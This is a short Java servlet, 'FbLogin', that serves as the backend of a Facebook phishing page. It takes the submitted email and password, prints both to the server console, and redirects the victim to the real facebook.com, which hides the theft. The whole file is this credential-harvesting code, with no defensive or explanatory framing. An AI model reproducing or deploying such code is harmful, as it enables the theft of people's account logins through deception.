package com.caps;

import java.io.IOException;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/FbLogin")
public class FbLogin extends HttpServlet{
	@Override
	protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
		String email = req.getParameter("email");
		String passwd = req.getParameter("pass");
		
		System.out.println(email);
		System.out.println(passwd);
		
		resp.sendRedirect("https://www.facebook.com/");
		
		
	}
} 